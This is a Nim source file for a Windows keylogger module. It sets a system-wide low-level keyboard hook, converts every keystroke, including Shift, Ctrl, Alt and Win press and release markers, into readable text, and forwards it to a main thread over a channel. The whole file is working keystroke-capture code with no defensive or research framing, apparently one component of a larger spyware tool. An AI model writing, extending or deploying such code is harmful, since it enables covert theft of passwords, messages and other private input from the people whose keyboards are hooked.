from tables import `[]`

import winim
import ../channels
from ../constants import keys

var eHook: HHOOK

# var keylog: string = ""

proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
  if (nCode == 0):

    let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
    let key: DWORD = kbs.vkCode
    let keyText: string = keys[kbs.vkCode]

    if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
      mainThread.send keyText

    elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
      if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or
          key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or
          key == VK_MENU or key == VK_LMENU or key == VK_RMENU or
          key == VK_CAPITAL or key == VK_NUMLOCK or key == VK_LWIN or
          key == VK_RWIN:
        var KeyName: string = keyText # Keys::KEYS[kbs->vkCode].Name # translate key to human friendly name
        KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
        mainThread.send KeyName

  result = CallNextHookEx(0, nCode, wparam, lparam)

proc initKeyloggerThread*(): void {.thread.} =
  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, 0, 0)

  var msg: MSG

  ## getMessage loop, am nev de asta ca altfel nu ruleaza procul
  while GetMessage(addr msg, 0, 0, 0):
    discard
